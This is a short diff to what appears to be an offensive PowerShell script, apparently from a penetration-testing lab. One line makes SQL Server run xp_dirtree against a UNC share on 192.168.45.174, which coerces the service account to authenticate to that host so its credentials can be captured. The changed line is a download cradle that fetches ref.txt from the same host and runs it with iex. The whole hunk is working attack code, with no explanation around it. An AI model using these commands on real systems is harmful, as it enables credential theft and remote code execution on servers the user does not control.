@@ -3,5 +3,5 @@ $cn.open()
 $cmd = new-object "System.Data.SqlClient.SqlCommand" ("exec master.dbo.xp_dirtree '\\192.168.45.174\share'", $cn)
 $reader = $cmd.ExecuteReader()
 
-"(new-object system.net.webclient).downloadstring('http://192.168.45/174/ref.txt') | iex"
+"(new-object system.net.webclient).downloadstring('http://192.168.45.174/ref.txt') | iex"
 
